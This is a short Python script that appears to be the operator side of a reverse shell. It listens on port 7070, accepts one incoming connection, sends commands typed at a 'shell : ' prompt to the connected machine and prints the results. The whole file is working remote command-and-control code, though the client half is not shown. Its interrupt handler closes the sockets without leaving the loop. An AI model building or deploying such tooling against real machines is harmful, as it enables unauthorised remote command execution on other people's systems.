import socket

ip_addr="0.0.0.0"
port=7070
header=64
encoding="utf-8"
exit_msg="!exit"

def send_msg(msg:str,conn):
    msg_len=len(msg.encode(encoding))
    msg_len_encode=str(msg_len).encode(encoding)
    msg_len_encode+=b' '*(header-len(msg_len_encode))
    conn.send(msg_len_encode)                         #send msg lem
    conn.send(msg.encode(encoding))                   #send msg   


connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.bind((ip_addr,port))
connection.listen(1)

print(f"Server runing in {ip_addr}  {port}")

conn,addr=connection.accept()
print("Connected")

while True:
    try:
        command=input("shell : ")
        send_msg(command,conn)
        result_len=conn.recv(header).decode(encoding)
        result=conn.recv(int(result_len)).decode(encoding)
        print(result)
    except KeyboardInterrupt:
        send_msg(exit_msg,conn)
        conn.close()
        connection.close()
